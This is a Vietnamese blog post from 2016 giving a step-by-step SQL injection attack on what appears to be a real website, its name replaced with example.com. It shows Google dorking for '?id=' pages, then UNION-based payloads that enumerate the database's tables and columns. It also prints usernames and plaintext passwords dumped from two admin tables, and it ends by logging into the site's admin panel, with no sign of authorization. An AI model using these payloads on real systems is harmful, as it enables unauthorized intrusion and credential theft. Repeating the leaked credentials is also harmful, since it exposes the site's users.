---
layout: post
title:  "Quy trình tấn công Sql injection"
date:   2016-7-17 18:00:23 +0700
categories: [Security]
comment: true
---
SQL injection bản chất là kết thúc câu query đó và chèn thêm query của mình.
Mình sẽ không đi sâu vào khái niệm `SQL injection` là gì. Mọi người có thể tham khảo thêm qua wiki!

Các bước cần thực hiện như sau:

**A. Tìm kiếm Website bị lỗi**

Có rất nhiều cách để tìm ra website bị lỗi này. Mình sữ dụng cú pháp ?id = để tìm ra tất cả web có đuôi là như vậy.
Sau đó thì check lần lưọt từng website thôi. Thử thêm dấu nháy vào cuối url sau đó request. Nếu website thay đổi thì nhiều
khả năng trang này có thể tấn công được vì dữ liệu đầu vào không được xử lý kí tự đặc biệt.

Sử dụng google để search các trang có đuôi là `?id =`

Sau một hồi lục lọi mình tìm đưọc trang này: `http://example.com/useddetails.php?id=43` (Tên website đã đưọc thay thế)

**B. Xác định số cột trong câu lệnh select và lấy version database**

Nếu union đúng số cột thì nó sẽ không hiện lỗi, ta cứ thể thêm số bắt đầu từ 2. Sau đó thay vào số bất kì có hiện trên màn hình là `version()`
để xem version của DB là gì.

http://example.com/useddetails.php?id=43` union select 1,version(),3,4,5,6,7--`

Và Database : `MySQL 5.0.96-log` đã hiện lên màn hình

Với mỗi version có cách khai thác tên bản khác nhau.

**C. Lấy tên bảng trong database.**

Chèn thêm đoạn sau để lấy tên table dựa vào version đã lấy đưọc phía trên.

`http://example.com/useddetails.php?id=null`<br/>
`union select 1,version(),3, group_concat(table_name),5,6,`<br/>
`7 from information_schema.tables where table_schema = database()--`

Tên table xuất hiện trên màn hình như sau.

````
admin_users,tbl_admin,tbl_cart,tbl_client,tbl_company_logo,tbl_countries,
tbl_employer,tbl_equipmnt,tbl_gallery,tbl_jobs,tbl_jobseeker,tbl_m_category,
tbl_news,tbl_partner,tbl_product,tbl_productcategory,tbl_project,tbl_qualification,
tbl_register_cảt,tbl_s_category,tbl_temp_cart
````

**D. Lấy tên cột và giá trị trong cột của bảng user**

Việc tiếp theo là kiểm tra xem table nào chứa tài khoản admin. Ơ đây ta nghi ngờ 2 bảng `admin_users` và `tbl_admin`
Mã hóa tên hai bảng sang kiểu hex và chèn vào phía sau link để lấy tên các column:


`union select 1,version(),3,group_concat(column_name),5,6,7`<br/>
`from information_schema.columns where table_name=0x61646d696e5f7573657273--`

hoặc

`union select 1,version(),3,group_concat(column_name),5,6,7`<br/>
`from information_schema.columns where table_name=0x74626c5f61646d696e--`

Sau đó thử lấy các giá trị trong các cột đó

`union select 1,2,3,group_concat(concat_ws(0x2f,user_name,user_password,user_type)),`
`5,6,7 from admin_users--`

````
HOD,FDW/FDW/STAFF,naziya/0000/ADMIN,nazy/111/STAFF
````

`union select 1,2,3,group_concat(concat_ws(0x2f,username,password,admin_type)),`
`5,6,7 from tbl_admin--`

````
administrator/admin/super admin,staff1/123/staff,parent/par123/parent
````
Vâng, như ta đã thấy, tất cả các mật khẩu đều không đưọc mã hóa. Thật may mắn để thực hiện bước tiếp theo.

**E. Tìm kiếm trang đăng nhập và tiến hành thử đăng nhập**

Đây cũng là một bước cũng đòi hỏi tý may mắn. Việc tìm ra đúng đường dẫn để đăng nhập trang admin cũng là vấn đề nan giải.

Một số công cụ hỗ trợ scan admin url như haijv hoặc các web scan online ...

Sau một hồi lục lọi thì cũng tìm ra đưọc url khá là bất ngờ

[http://example/admin/my_home.php](#)

Sau đó tiến hành đăng nhập và xem thử thế nào. Done!

